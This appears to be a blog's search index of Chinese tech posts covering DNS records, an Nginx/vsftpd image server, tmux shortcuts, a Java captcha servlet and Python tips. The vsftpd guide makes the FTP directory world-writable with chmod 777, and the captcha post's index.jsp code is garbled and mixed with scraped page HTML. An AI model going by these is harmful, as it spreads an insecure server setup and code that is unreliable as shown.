）别名记录，允许您将多个名字映射到同一台计算机。通常用于同时提供WWW和MAIL服务的计算机。例如：\n\n\n\n类型\n名称\n值\n\n\n\n\nCNAME\nwww\nsmilelc3.github.io\n\n\nCNAME\nmail\nym.163.com\n\n\nCNAME\n@\nsmilelc3.github.io\n\n\n\n若有一台计算机名为smilelc3.github.io（A记录），它能提供WWW服务，而另一台机器名为ym.163.com能提供mail服务，我希望www.liuchang.men能够指向smilelc3.github.io，而mail.liuchang.men能够指向ym.163.com，则记录值如上。\n\n注意：记录值留白或使用@符代表使用域名自身作为名称，上表第三条中，@代表liuchang.men指向smilelc3.github.io域名。\n\nAAAA记录（IPv6主机记录）\nAAAA 记录是用来指定主机名（或域名）对应的IPv6地址记录。\nTXT记录\nTXT记录一般是为某条记录设置说明，用来保存域名的附加文本信息，TXT记录的内容按照一定的格式编写，最常用的是SPF（Sender Policy Framework）格式。反垃圾邮件是TXT的应用之一，SPF是跟DNS相关的一项技术，它的内容写在DNS的TXT类型的记录里面。\n在命令行下可以使用如下命令来查看域名liuchang.men的TXT记录。\nnslookup -qt=txt liuchang.men\n\nMX记录\nMX记录也叫做邮件路由记录，用户可以将该域名下的邮件服务器指向到自己的mail\nserver上，然后即可自行操控所有的邮箱设置。您只需在线填写您服务器的IP地址，即可将您域名下的邮件全部转到您自己设定相应的邮件服务器上。MX记录的作用是给寄信者指明某个域名的邮件服务器有哪些，SPF格式的TXT记录的作用跟MX记录相反，它向收信者表明，哪些邮件服务器是经过某个域名认可发送邮件的。\nDS记录\nNS（Name\nServer）记录是域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。\n您注册域名时，总有默认的DNS服务器，每个注册的域名都是由一个DNS域名服务器来进行解析的，DNS服务器NS记录地址一般以以下的形式出现：\nns1.domain.com、ns2.domain.com等。简单的说，NS记录是指定由哪个DNS服务器解析你的域名。\nURL记录\n将域名指向一个http(s)协议地址，访问域名时，自动跳转至目标地址。\n"},{"title":"Ubuntu：基于Nginx和vsftpd搭建图片服务器","url":"/2018/04/16/Ubuntu%EF%BC%9A%E5%9F%BA%E4%BA%8ENginx%E5%92%8Cvsftpd%E6%90%AD%E5%BB%BA%E5%9B%BE%E7%89%87%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"\n首先，此次项目正好需要对某云服务商的帮助文档进行全文抓取，涉及到对图片进行转存，需要重新搭建一个图片服务器方便管理，也避免数据丢失，经过多方案尝试，最终选择如下的方法，话不多说，开始行动。\n环境说明\n\n系统 Ubuntu 18.04\n已开放 21号端口（ftp），80号端口（http）\n\n安装Nginx\n安装所需依赖库\nsudo apt-get updatesudo apt-get install build-essential # 安装gcc g++依赖库sudo apt-get install libpcre3 libpcre3-dev # 安装prce依赖库sudo apt-get install zlib1g-dev # 安装 zlib依赖库sudo apt-get install openssl # 安装 ssl依赖库\n编译Nginx\n先下载Nginx对应的最新版本（linux）\n我当前的最新版本是：1.13.\ntar -zxvf nginx-*   #解压下载下来的压缩包cd nginx-*  #进入解压目录./configure --prefix=/usr/local/nginx   #配置并生成makefile，自行配置安装位置sudo make   #编译 make install    #安装/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf #启动Nginx\n此时Nginx就安装完成了，会使用默认的80端口启动，如果有启动，启动完成可直接通过服务器ip或者云解析的域名查看默认网页。\n默认网页如图所示：\n\n安装与配置vsftpd\nsudo apt-get install vsftpd #安装vsftpdsudo service vsftpd start   #启动vsftpd服务\n\n下面方法目的在于单独为ftp建立一个用户，并建立images文件夹存储图片\n\nsudo mkdir /home/ftpuser    #新建ftpuser目录作为ftp主目录sudo useradd -d /home/ftpuser -s /bin/bash ftpuser  #新建ftpuser用户指定用户主目录passwd ftpuser  #设置用户密码chown ftpuser /home/ftpuser #制定用户组chmod 777 -R /home/ftpuser  #为ftpuser下所有文件开放访问权限\n新建文件/etc/vsftpd.user_list，用于存放允许访问ftp的用户\nsudo nano /etc/vsftpd.user_list\n文本中添加ftpuser用户名\n\n编辑vsftpd配置文件\nsudo nano /etc/vsftpd.conf\n作如下修改\n\n去除注释 write_enable=YES\n末尾添加 userlist_file=/etc/vsftpd.user_list\n末尾添加 userlist_enable=YES\n末尾添加 userlist_deny=NO\n\n保存，退出\n重启vsftpd服务\nsudo service vsftpd restart\n用filezilla或其他ftp软件，并使用刚刚新建的用户名和密码访问测试是否成功。\n创建存储图片的根目录\nsudo su cd /home/ftpusermkdir -p www/images #这里使用www/images为例mkdir /usr/local/nginx/html/images  #在nginx目录下创建images目录\nsudo nano /usr/local/nginx/conf/nginx.conf    #在默认的server里再添加一个location并指定实际路径\n插入内容为：\nlocation /images/ &#123;    root  /home/ftpuser/www/;    autoindex on;&#125;\n\n停用与重新载入nginx\n/usr/local/nginx/sbin/nginx -s stop/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf\n最后测试\n\n"},{"title":"Tmux 快捷键速查表","url":"/2020/09/30/Tmux%20%E5%BF%AB%E6%8D%B7%E9%94%AE%E9%80%9F%E6%9F%A5%E8%A1%A8/","content":"Tmux 快捷键速查表\n启动新会话：\ntmux [new -s 会话名 -n 窗口名]\n恢复会话：\ntmux at [-t 会话名]\n列出所有会话：\ntmux ls\n关闭会话：\ntmux kill-session -t 会话名\n关闭除指定会话外的所有会话：\ntmux kill-session -a -t 会话名\n销毁所有会话并停止Tmux：\ntmux kill-server\n在 Tmux 中，按下 Tmux 前缀\nctrl+b，然后\n会话\n:new&lt;回车&gt;   启动新会话s           列出所有会话$           重命名当前会话\n窗口\nc 创建新窗口w 列出所有窗口n 后一个窗口p 前一个窗口f 查找窗口, 重命名当前窗口；这样便于识别. 修改当前窗口编号；相当于窗口重新排序&amp; 关闭当前窗口\n调整窗口排序\n:swap-window -s 2 -t 0 交换2号和0号窗口:swap-window -t 0  交换当前和0号窗口:move-window -t 0  移动当前窗口到0号\n窗格\n%\t垂直分割&quot;\t水平分割o\t前一个窗格;\t后一个窗格x\t关闭窗格sapce(空格键)\t切换布局q\t显示每个窗格是第几个，当数字出现的时候按数字几就选中第几个窗格&#123;\t与上一个窗格交换位置&#125;\t与下一个窗格交换位置z\t切换窗格最大化/最小化\n同步窗格\n如果您将窗口划分为多个窗格，则可以使用synchronize-panes选项同时向每个窗格发送相同的键盘输入：\n:setw synchronize-panes [on/off]\n你可以指定开启on或停用off，否则重复执行命令会在两者间切换。\n这个选项值针对当前个窗口有效，不会影响别的会话和窗口。\n完事儿之后再次执行命令来关闭。\n\n调整窗格尺寸\n如果你不喜欢默认布局，可以重调窗格的尺寸。虽然这很容易实现，但一般不需要这么干。这几个命令用来调整窗格：\n:resize-pane -D          当前窗格向下扩大 1 格:resize-pane -U          当前窗格向上扩大 1 格:resize-pane -L          当前窗格向左扩大 1 格:resize-pane -R          当前窗格向右扩大 1 格:resize-pane -D 20       当前窗格向下扩大 20 格:resize-pane -t 2 -L 20  编号为 2 的窗格向左扩大 20 格\n杂项\nd  退出 tmux（tmux 仍在后台运行）t  窗口中央显示一个数字时钟?  列出所有快捷键:  命令提示符\n配置选项\n# 鼠标支持 - 设置为 on 来启用鼠标:set -g mouse on# 设置默认终端模式为 256color:set -g default-terminal &quot;screen-256color&quot;# 启用活动警告:setw -g monitor-activity on:set -g visual-activity on# 窗口名列表居中:set -g status-justify centre\n"},{"title":"markdown语法简介","url":"/2018/01/07/markdown%E8%AF%AD%E6%B3%95%E7%AE%80%E4%BB%8B/","content":"一级标题\n二级标题\n三级标题\n四级标题\n五级标题\n六级标题\n\n无序列表\n\n项目一\n项目二\n项目三\n\n子项目\n子项目\n\n\n有序列表\n\n项目一\n项目二\n项目三\n\n二级项目\n二级项目\n\n三级项目\n三级项目\n\n\n项目四\n\n\n\n一级引用\n\n二级引用\n\n三级引用\n\n\n\n\n粗体：Markdown\n斜体：Markdown\n粗体+斜体：Markdown\n删除线：MarkDown\n网址：liuchang.men smile@liuchang.men\n使用脚注1\n\nTODOLIST\n\n待办事务一\n待办事务二\n\n待办事务三\n待办事务四\n\n\n\n关于 latex 公式\n行内公式：E = mc2\n单行公式：\n$x=\\frac{-b\\pm\\sqrt{b^2-4ac}}{2a}$\n\n来张图片吧\n\n\n这是表格\n\n\n\nTables(左对齐)\nAre（居中对齐）\nCool（右对齐）\n\n\n\n\n1\nright-aligned\n$1600\n\n\n2\ncentered\n$12\n\n\n3\nare neat\n$1\n\n\n\n\n代码测试\n行内代码 nano\n代码块\nimport mathprint(&quot;hello world!&quot;)\n#include &lt;stdio.h&gt;int main() &#123;  printf(&quot;hello world!\\n&quot;);  return 0;&#125;\n#include &lt;iostream&gt;using namespace std;int main() &#123;  cout &lt;&lt; &quot;hello world!&quot; &lt;&lt; endl;  return 0;&#125;\n\n\n\nHi 这是一个注脚，会自动拉到最后排版↩︎\n\n\n"},{"title":"linux下用idea调试java web：点击图片文字验证码","url":"/2018/05/11/linux%E4%B8%8B%E7%94%A8idea%E8%B0%83%E8%AF%95java%20web%EF%BC%9A%E7%82%B9%E5%87%BB%E5%9B%BE%E7%89%87%E6%96%87%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81/","content":"\n环境说明\nLinux环境：deepin 15.5 (debian\n/ x64) tomcat：tomcat8\nIDEA：jetbrain IntelliJ IDEA Ultimate(支持java web环境)\ntomcat 安装配置\n安装tomcat8\nsudo apt-get updatesudo apt-get install tomcat8\n设置tomcat文件权限\n\nTomcat home directory : /usr/share/tomcat8\nTomcat base directory : /var/lib/tomcat8\n\ncd /usr/share/tomcat8 &amp;&amp; sudo chmod -R 755 *cd /var/lib/tomcat8 &amp;&amp; sudo chmod -R 755 *\n启用与关闭tomcat\nsudo service tomcat8 start  #开启tomcat8服务，会占用8080端口sudo service tomcat8 stop   #关闭tomcat8服务\n文件环境\nrun/debug 参数\n\n项目结构\n\n\n文件结构\n\nJcaptchaServlet源码：后端生成验证图片\nimport javax.imageio.ImageIO;import javax.servlet.ServletException;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.awt.*;import java.awt.image.BufferedImage;import java.io.File;import java.io.IOException;import java.io.UnsupportedEncodingException;import java.util.Random;public class JcaptchaServlet extends HttpServlet &#123;    private Random random = new Random();    public void doGet(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        int height = 220;  //图片高        int width = 220;  //图片宽        BufferedImage image = new BufferedImage(width,height,BufferedImage.TYPE_INT_RGB);        Graphics2D g =  (Graphics2D) image.getGraphics();        String picPath= JcaptchaServlet.class.getClassLoader().getResource(&quot;../image/&quot;+(random.nextInt(4)+1)+&quot;.jpg&quot;).getPath();  //读取本地图片，做背景图片        g.drawImage(ImageIO.read(new File(picPath)), 0, 20, width, height, null); //将背景图片从高度20开始        g.setColor(Color.white);  //设置颜色        g.drawRect(0, 0, width-1, height-1); //画边框        g.setFont(new Font(&quot;宋体&quot;,Font.BOLD,20)); //设置字体        Integer x=null,y=null;  //用于记录坐标        String target=null; // 用于记录文字        for(int i=0;i&lt;4;i++)&#123;  //随机产生4个文字，坐标，颜色都不同            g.setColor(new Color(random.nextInt(50)+200, random.nextInt(150)+100, random.nextInt(50)+200));            String str=getRandomChineseChar();            int a=random.nextInt(width-100) + 50;            int b=random.nextInt(height-70) + 55;            if(x==null)&#123;                x=a; //记录第一个x坐标            &#125;            if(y==null)&#123;                y=b;//记录第一个y坐标            &#125;            if(target==null)&#123;                target=str; //记录第一个文字            &#125;            g.drawString(str, a, b);        &#125;        g.setColor(Color.white);        g.drawString(&quot;点击&quot;+target, 0,20);//写入验证码第一行文字  “点击..”        request.getSession().setAttribute(&quot;gap&quot;,x+&quot;:&quot;+y);//将坐标放入session        //5.释放资源        g.dispose();        //6.利用ImageIO进行输出        ImageIO.write(image, &quot;jpg&quot;, response.getOutputStream()); //将图片输出    &#125;    //网上找的，随机产生汉字的方法    private String getRandomChineseChar()    &#123;        String str = null;        int hs, ls;        Random random = new Random();        hs = (176 + Math.abs(random.nextInt(39)));        ls = (161 + Math.abs(random.nextInt(93)));        byte[] b = new byte[2];        b[0] = (new Integer(hs).byteValue());        b[1] = (new Integer(ls).byteValue());        try        &#123;            str = new String(b, &quot;GBk&quot;); //转成中文        &#125;        catch (UnsupportedEncodingException ex)        &#123;            ex.printStackTrace();        &#125;        return str;    &#125;    public void doPost(HttpServletRequest request, HttpServletResponse response)            throws ServletException, IOException &#123;        doGet(request, response);    &#125;&#125;\nLogin源码：用于登陆正确与否确认\nimport javax.servlet.ServletException;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.http.HttpSession;import java.io.IOException;/** * Servlet implementation class Login */@WebServlet(&quot;/Login&quot;)public class Login extends HttpServlet &#123;    private static final long serialVersionUID = 1L;    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        // TODO Auto-generated method stub        response.setContentType(&quot;text/html;charset=utf-8&quot;); //设置编码        //获取前端传来的坐标        String xs=request.getParameter(&quot;x&quot;);        String ys=request.getParameter(&quot;y&quot;);        HttpSession session = request.getSession();        String str = (String) session.getAttribute(&quot;gap&quot;);//获取session中的gap        if(str==null)&#123;            response.getWriter().write(&quot;验证码超时&quot;);            return;        &#125;        String[] split2 = str.split(&quot;:&quot;);        int x=    Integer.parseInt(xs);        int y=Integer.parseInt(ys);        int x1=    Integer.parseInt(split2[0]);        int y1=Integer.parseInt(split2[1]);        if(x1-2&lt;x &amp;&amp; x&lt;x1+22 &amp;&amp; y1-22&lt;y &amp;&amp; y&lt;y1+2)&#123;  //若前端上传的坐标在session中记录的坐标的一定范围内则验证成功            response.getWriter().write(&quot;验证成功&quot;);        &#125;else&#123;            response.getWriter().write(&quot;验证失败&quot;);        &#125;    &#125;    /**     * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)     */    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;        // TODO Auto-generated method stub        doGet(request, response);    &#125;&#125;\nweb.xml：servlet配置参数\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt;    &lt;display-name&gt;CheckCode&lt;/display-name&gt;    &lt;welcome-file-list&gt;        &lt;welcome-file&gt;index.html&lt;/welcome-file&gt;        &lt;welcome-file&gt;index.htm&lt;/welcome-file&gt;        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;        &lt;welcome-file&gt;default.html&lt;/welcome-file&gt;        &lt;welcome-file&gt;default.htm&lt;/welcome-file&gt;        &lt;welcome-file&gt;default.jsp&lt;/welcome-file&gt;    &lt;/welcome-file-list&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;captcha&lt;/servlet-name&gt;        &lt;servlet-class&gt;JcaptchaServlet&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet&gt;        &lt;servlet-name&gt;Login&lt;/servlet-name&gt;        &lt;servlet-class&gt;Login&lt;/servlet-class&gt;    &lt;/servlet&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;Login&lt;/servlet-name&gt;        &lt;url-pattern&gt;*.shtml&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;captcha&lt;/servlet-name&gt;        &lt;url-pattern&gt;/captcha.svl&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;&lt;/web-app&gt;\nindex.jsp：前端界面\n&lt;html lang = &quot;zh-CN&quot;&gt;    &lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;script type=&quot;text/javascript&quot; src=&quot;&#123;pageContext.request.contextPath&#125;/js/jquery.min.js&quot;&gt;                  &lt;/span&gt;(function()&#123;            &lt;span class=&quot;katex math inline&quot;&gt;(&quot;#image&quot;).click(function(event)&#123;                 var obj=this;                 var x=event.offsetX;//获取点击时鼠标相对图片坐标                 var y=event.offsetY;                 &lt;/span&gt;.ajax(&#123;                    url:&quot;login.shtml&quot;, //ajax提交                    type:&quot;post&quot;,                    data:&#123;&#x27;x&#x27;:x,&quot;y&quot;:y&#125;,                    success:function(data)&#123;                        alert(data)                        obj.src=obj.src+&quot;?date=&quot;+new Date();                    &#125;                &#125;)            &#125;);        &#125;)        &amp;lt;/script&amp;gt;    &amp;lt;/head&amp;gt;    &amp;lt;body&amp;gt;        &amp;lt;img id=&quot;image&quot; src=&quot;$&#123;pageContext.request.contextPath&#125;/captcha.svl&quot; style=&quot;cursor: pointer;&quot; &amp;gt;    &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;注意：需要另行配置依赖（位置见结构图）&lt;br /&gt;jar包：&lt;code&gt;javax.servlet-api-4.0.0.jar&lt;/code&gt;&lt;br /&gt;jQuery包：&lt;code&gt;jquery.min.js&lt;/code&gt;：&lt;code&gt;v1.11.3&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;\t\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t&lt;div class=&quot;section section-blog-info&quot;&gt;\t\t\t&lt;div class=&quot;row&quot;&gt;\t\t\t\t&lt;div class=&quot;col-md-6&quot;&gt;\t\t\t\t\t&lt;div class=&quot;entry-categories&quot;&gt;分类：\t\t\t\t\t\t&lt;span class=&quot;label label-primary&quot;&gt;&lt;a href=&quot;http://liuchang.men/category/uncategorized/&quot;&gt;未分类&lt;/a&gt;&lt;/span&gt;\t\t\t\t\t&lt;/div&gt;\t\t\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t\t        &lt;div class=&quot;col-md-6&quot;&gt;            &lt;div class=&quot;entry-social&quot;&gt;                &lt;a target=&quot;_blank&quot; rel=&quot;tooltip&quot;                   data-original-title=&quot;分享到 Facebook&quot;                   class=&quot;btn btn-just-icon btn-round btn-facebook&quot;                   href=&quot;https://www.facebook.com/sharer.php?u=http://liuchang.men/2018/05/12/linux%e4%b8%8b%e7%94%a8idea%e8%b0%83%e8%af%95java-web%ef%bc%9a%e7%82%b9%e5%87%bb%e5%9b%be%e7%89%87%e6%96%87%e5%ad%97%e9%aa%8c%e8%af%81%e7%a0%81/&quot;&gt;                   &lt;i class=&quot;fa fa-facebook&quot;&gt;&lt;/i&gt;                &lt;/a&gt;                                &lt;a target=&quot;_blank&quot; rel=&quot;tooltip&quot;                   data-original-title=&quot;分享至微博&quot;                   class=&quot;btn btn-just-icon btn-round btn-twitter&quot;                   href=&quot;http://twitter.com/share?url=http://liuchang.men/2018/05/12/linux%e4%b8%8b%e7%94%a8idea%e8%b0%83%e8%af%95java-web%ef%bc%9a%e7%82%b9%e5%87%bb%e5%9b%be%e7%89%87%e6%96%87%e5%ad%97%e9%aa%8c%e8%af%81%e7%a0%81/&amp;#038;text=linux%E4%B8%8B%E7%94%A8idea%E8%B0%83%E8%AF%95java%20web%EF%BC%9A%E7%82%B9%E5%87%BB%E5%9B%BE%E7%89%87%E6%96%87%E5%AD%97%E9%AA%8C%E8%AF%81%E7%A0%81&quot;&gt;                   &lt;i class=&quot;fa fa-twitter&quot;&gt;&lt;/i&gt;                &lt;/a&gt;                                &lt;a rel=&quot;tooltip&quot;                   data-original-title=&quot; Share on Email&quot;                   class=&quot;btn btn-just-icon btn-round&quot;                   href=&quot;mailto:?subject=linux下用idea调试java%20web：点击图片文字验证码&amp;#038;body=http://liuchang.men/2018/05/12/linux%e4%b8%8b%e7%94%a8idea%e8%b0%83%e8%af%95java-web%ef%bc%9a%e7%82%b9%e5%87%bb%e5%9b%be%e7%89%87%e6%96%87%e5%ad%97%e9%aa%8c%e8%af%81%e7%a0%81/&quot;&gt;                   &lt;i class=&quot;fa fa-envelope&quot;&gt;&lt;/i&gt;               &lt;/a&gt;            &lt;/div&gt;\t\t&lt;/div&gt;\t\t\t&lt;/div&gt;\t\t\t&lt;hr&gt;\t\t\t&lt;div id=&quot;comments&quot; class=&quot;section section-comments&quot;&gt;\t&lt;div class=&quot;row&quot;&gt;\t\t&lt;div class=&quot;col-md-12&quot;&gt;\t\t\t&lt;div class=&quot;media-area&quot;&gt;\t\t\t\t&lt;h3 class=&quot;hestia-title text-center&quot;&gt;\t\t\t\t\t\t\t\t\t&lt;/h3&gt;\t\t\t\t\t\t\t&lt;/div&gt;\t\t\t&lt;div class=&quot;media-body&quot;&gt;\t\t\t\t\t&lt;div id=&quot;respond&quot; class=&quot;comment-respond&quot;&gt;\t\t&lt;h3 class=&quot;hestia-title text-center&quot;&gt;发表评论 &lt;small&gt;&lt;a rel=&quot;nofollow&quot; id=&quot;cancel-comment-reply-link&quot; href=&quot;/2018/05/12/linux%e4%b8%8b%e7%94%a8idea%e8%b0%83%e8%af%95java-web%ef%bc%9a%e7%82%b9%e5%87%bb%e5%9b%be%e7%89%87%e6%96%87%e5%ad%97%e9%aa%8c%e8%af%81%e7%a0%81/#respond&quot; style=&quot;display:none;&quot;&gt;取消回复&lt;/a&gt;&lt;/small&gt;&lt;/h3&gt; &lt;span class=&quot;pull-left author&quot;&gt; &lt;div class=&quot;avatar&quot;&gt;&lt;img alt=&#x27;&#x27; src=&#x27;http://1.gravatar.com/avatar/783dfac778f4f63a2889a4d32384232c?s=64&amp;#038;d=mm&amp;#038;r=g&#x27; srcset=&#x27;http://1.gravatar.com/avatar/783dfac778f4f63a2889a4d32384232c?s=128&amp;#038;d=mm&amp;#038;r=g 2x&#x27; class=&#x27;avatar avatar-64 photo&#x27; height=&#x27;64&#x27; width=&#x27;64&#x27; /&gt;&lt;/div&gt; &lt;/span&gt;\t\t\t&lt;form action=&quot;http://liuchang.men/wp-comments-post.php&quot; method=&quot;post&quot; id=&quot;commentform&quot; class=&quot;form media-body&quot;&gt;\t\t\t\t&lt;p class=&quot;logged-in-as&quot;&gt;&lt;a href=&quot;http://liuchang.men/wp-admin/profile.php&quot; aria-label=&quot;已登入为admin。编辑您的个人资料。&quot;&gt;已登入为admin&lt;/a&gt;。&lt;a href=&quot;http://liuchang.men/wp-login.php?action=logout&amp;amp;redirect_to=http%3A%2F%2Fliuchang.men%2F2018%2F05%2F12%2Flinux%25e4%25b8%258b%25e7%2594%25a8idea%25e8%25b0%2583%25e8%25af%2595java-web%25ef%25bc%259a%25e7%2582%25b9%25e5%2587%25bb%25e5%259b%25be%25e7%2589%2587%25e6%2596%2587%25e5%25ad%2597%25e9%25aa%258c%25e8%25af%2581%25e7%25a0%2581%2F&amp;amp;_wpnonce=92457eb6ae&quot;&gt;登出？&lt;/a&gt;&lt;/p&gt;&lt;div class=&quot;form-group label-floating is-empty&quot;&gt; &lt;label class=&quot;control-label&quot;&gt;在想些什么？&lt;/label&gt;&lt;textarea id=&quot;comment&quot; name=&quot;comment&quot; class=&quot;form-control&quot; rows=&quot;6&quot; aria-required=&quot;true&quot;&gt;&lt;/textarea&gt;&lt;span class=&quot;hestia-input&quot;&gt;&lt;/span&gt; &lt;/div&gt;&lt;p class=&quot;form-submit&quot;&gt;&lt;input name=&quot;submit&quot; type=&quot;submit&quot; id=&quot;submit&quot; class=&quot;btn btn-primary pull-right&quot; value=&quot;发表评论&quot; /&gt; &lt;input type=&#x27;hidden&#x27; name=&#x27;comment_post_ID&#x27; value=&#x27;625&#x27; id=&#x27;comment_post_ID&#x27; /&gt;&lt;input type=&#x27;hidden&#x27; name=&#x27;comment_parent&#x27; id=&#x27;comment_parent&#x27; value=&#x27;0&#x27; /&gt;&lt;/p&gt;&lt;input type=&quot;hidden&quot; id=&quot;_wp_unfiltered_html_comment_disabled&quot; name=&quot;_wp_unfiltered_html_comment_disabled&quot; value=&quot;7d727c2e29&quot; /&gt;&lt;script&gt;(function()&#123;if(window===window.parent)&#123;document.getElementById(&#x27;_wp_unfiltered_html_comment_disabled&#x27;).name=&#x27;_wp_unfiltered_html_comment&#x27;;&#125;&#125;)();\t\t\t\t\t\t\n"},{"title":"python中常量类的实现","url":"/2019/12/31/python%E4%B8%AD%E5%B8%B8%E9%87%8F%E7%B1%BB%E7%9A%84%E5%AE%9E%E7%8E%B0/","content":"众所周知，在Python中其实并没有一个严格定义的常量类概念。\n目前所采用的常用约定俗成的方式是采用命名全为大写字母的方式来标识别常量。\n但实际上这种方式并不能起到防止修改的功能，而只是从语义和可读性上做了区分。\n现已有了一种基于__setter__和__delattr__的实现方法：\n# coding:utf-8import sysclass _const:    def __new__(cls, *args, **kw):        if not hasattr(cls, &#x27;_instance&#x27;):            orig = super(_const, cls)            cls._instance = orig.__new__(cls, *args, **kw)        return cls._instance    # 已存在    class ConstBuiltError(TypeError):        def __init__(self, name):            self.msg = &quot;Can&#x27;t rebind const instance attribute (%s)&quot; % name        def __str__(self):            return &#x27;error msg: &#123;&#125;&#x27;.format(self.msg)    # 非全大写错误（可下划线）    class ConstCaseError(TypeError):        def __init__(self, name):            self.msg = &#x27;const name &quot;%s&quot; is not all uppercase&#x27; % name        def __str__(self):            return &#x27;error msg: &#123;&#125;&#x27;.format(self.msg)        def __repr__(self):            return self.__str__()    # 删除错误    class ConstDelError(TypeError):        def __init__(self, name):            self.msg = &quot;Can&#x27;t delete const instance attribute (%s)&quot; % name        def __str__(self):            return &#x27;error msg: &#123;&#125;&#x27;.format(self.msg)        def __repr__(self):            return self.__str__()    # 创建时核对是否重复或全大写    def __setattr__(self, name, value):        if self.__dict__.__contains__(name):            raise self.ConstBuiltError(name)        if not name.isupper():            raise self.ConstCaseError(name)        self.__dict__[name] = value    # 禁止删除    def __delattr__(self, name):        if self.__dict__.__contains__(name):            raise self.ConstDelError(name)        raise self.ConstDelError(name)# 实例化一个类Const = _const()Const.TEST = &#x27;test&#x27;\n假设文件保存为constClass使用的时候只要from constClass import\nConst，便可以直接定义常量了，比如：\nfrom constClass import Constprint(Const.TEST)    # 已有定义Const.AUTHOR = &#x27;smile&#x27;   # 首次定义Const.AUTHOR = &#x27;smilelc&#x27;  # 修改Const.author = &#x27;smile&#x27;          # 小写定义del Const.AUTHOR                # 删除\n\n已有定义时，如Const.TEST = 'test'，可直接调用；\n上面的Const.AUTHOR定义后便不可再更改，因此Const.AUTHOR = ‘smilelc’会抛出ConstBuiltError异常；\n而常量名称如果小写，如Const.author ='smile'，也会抛出ConstCaseError异常；\n一旦定义完后，若删除，会抛出ConstDelError。\n\n"},{"title":"python学习个人看法","url":"/2017/05/25/python%E5%AD%A6%E4%B9%A0%E4%B8%AA%E4%BA%BA%E7%9C%8B%E6%B3%95/","content":"\nlife is short, we need python!\npython介绍\n一种编程语言\n\n完成同一个任务，C语言要写1000行代码，Java只需要写100行，而Python可能只要20行。用Python完成项目，编写的代码量更少，代码简短可读性强，python编程简单直接。\n\n适合快速开发\nPython是美国主流大学受欢迎的入门编程语言，诞生至今已经过25个年头。相对于其他语言，它更加易学、易读，非常适合快速开发。Python编程简单直接，难度低于java，更适合初学编程者，让初学者专注于编程逻辑，而不是困惑于晦涩的语法细节上。\n学习主要平台\n慕课网 www.imooc.com\n实验楼 www.shiyanlou.com\n平台特点\n\n慕课网\n\n偏重于python基础语法学习，包括且不限于右侧内容。其平台内容较为简单，很适合初学者学习；同时它可以在线评测答案，且有较为浓厚的讨论氛围。当然也是免费的。\n\n实验楼\n\n宗旨是随时随地，动手实验。网站提供的不是培训视频，而是配置好的虚拟机，通过虚拟的实验环境，学习者可以边看文档便动手操作，但针对某些较为热门的实验，需要付一定的费用。\n学习流程建议\npython入门 -&gt; 实验楼简单实验 -&gt; python(进阶) -&gt;\n实验楼有难度的实验+python爬虫\n\npython入门\n​ http://www.imooc.com/learn/177\n实验楼简单实验\n​ 200行Python代码实现2048\n​ Python\n图片转字符画\n​ Python3 &amp; OpenCV\n视频转字符动画\npython(进阶)\n​ http://www.imooc.com/learn/317\n实验楼有难度的实验+python爬虫\n​ k-近邻算法实现手写数字识别系统–《机器学习实战\n》\n​ 深度学习初探——入门DL主流框架\n​ 川普撞脸希拉里(基于\nOpenCV 的面部特征交换\n​ Python3\n实现火车票查询工具\n​ 神经网络实现手写字符识别系统\n\n补充：实验楼的项目很多很多，有意思的也很多很多，还是鼓励大家多看看\n另附python语法学习建议：\n\n基础知识包括：变量和数据类型，List和Tuple，条件判断和循环，Dict和Set，函数，切片，迭代和列表生式\n​\n注意：学习基础知识切莫着急，一定要打好基础，这样才会更好的应用python\n进阶知识：学完掌握基础知识之后，纪要学习进阶知识了。\n进阶知识包括：函数式编程，模块，面向对象编程基础，类的继承和定制类\npython装饰器：装饰器是很重要的一个知识点\n\n​\n关于装饰器需要涉及导函数作用域，闭包的使用和修饰器的概念基础及使用\n\n​ 高阶知识：文件处理，错误和异常，正则表达式\n​ 提升阶段：数据库操作，Django框架和爬虫技术\n\n"},{"title":"python爬虫之BeatifulSoup Select方法总结","url":"/2018/03/25/python%E7%88%AC%E8%99%AB%E4%B9%8BBeatifulSoup%20Select%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/","content":"\n简介\n\nBeautifulSoup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。\nBeautifulSoup自动将输入文档转换为Unicode编码，输出文档转换为utf-8编码。你不需要考虑编码方式，除非文档没有指定一个编码方式，这时，Beautiful 